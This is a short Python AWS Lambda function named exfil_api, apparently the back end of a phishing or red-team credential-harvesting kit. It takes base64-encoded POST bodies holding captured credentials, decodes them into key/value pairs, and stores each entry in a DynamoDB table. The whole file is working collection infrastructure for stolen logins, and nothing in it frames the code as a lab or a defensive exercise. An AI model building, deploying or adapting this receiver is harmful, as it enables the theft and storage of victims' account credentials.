import json
import os
import boto3
import base64
import urllib.parse

import logging
logger = logging.getLogger()
logger.setLevel(logging.INFO)

def exfil_api(event, context):
    """
    Get credentials via API call
    Decode base64 in body of POST requests, and write out to DynamoDB Table
    """
    body_data = event.get('body')
    creds_decoded = base64.b64decode(body_data).decode('utf-8')

    creds = dict()
    for elements in creds_decoded.split("&"):
        key = elements.split("=")[0]
        value = urllib.parse.unquote(elements.split("=")[1])
        creds[key] = value
    
    write_to_dynamo(creds)

    response = {
        'statusCode': 200,
        'body': json.dumps(dict()),
    }

    return response

def write_to_dynamo(creds: dict()):

    client =  boto3.client('dynamodb')

    Item = dict()
    for k in creds.keys():
        Item[k] = {'S': creds[k]}

    response = client.put_item(
    TableName=os.environ['DYNAMO_TABLE'],
    Item=Item)

    return response